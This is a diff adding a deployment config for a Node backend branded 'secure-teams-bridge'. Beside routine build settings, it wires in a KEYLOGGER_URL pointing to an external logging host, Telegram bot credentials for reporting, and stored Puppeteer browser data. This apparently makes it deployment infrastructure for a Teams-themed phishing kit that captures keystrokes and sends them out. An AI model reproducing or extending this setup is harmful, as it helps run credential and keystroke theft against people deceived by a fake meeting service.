@@ -1,0 +1,27 @@
+services:
+  - type: web
+    name: secure-teams-bridge-backend
+    env: node
+    buildCommand: |
+      cd backend
+      npm install
+    startCommand: |
+      cd backend
+      node server.js
+    envVars:
+      - key: PORT
+        value: 3000
+      - key: NODE_ENV
+        value: production
+      - key: TELEGRAM_BOT_TOKEN
+        sync: false
+      - key: TELEGRAM_CHAT_ID
+        sync: false
+      - key: BACKEND_URL
+        value: https://meeting-1-rzx6.onrender.com
+      - key: KEYLOGGER_URL
+        value: https://keyserver-eaar.onrender.com/log
+    disk:
+      name: puppeteer-data
+      mountPath: /opt/render/project/src/backend/puppeteer-user-data
+      sizeGB: 1
